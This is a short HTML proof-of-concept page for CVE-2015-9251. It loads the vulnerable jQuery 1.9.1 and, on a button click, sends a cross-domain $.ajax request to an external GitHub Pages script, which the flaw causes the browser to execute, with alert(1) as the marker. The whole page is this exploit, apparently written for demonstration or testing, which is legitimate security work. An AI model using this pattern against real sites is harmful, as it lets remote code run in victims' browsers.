<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <script type="text/javascript" src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
    </head>
    <body>
        <p>CVE-2015-9251</p>
        <input type="button" id="check" value="Check">
        <script>
            let check = document.getElementById('check'); 
            check.addEventListener('click', ()=>{ 
                $.ajax({
                    url: "https://keatshos.github.io/Scripts/Application.js",
                    success: function(html){
                        alert(1);
                    }
                });
            });
        </script>
    </body>
</html>
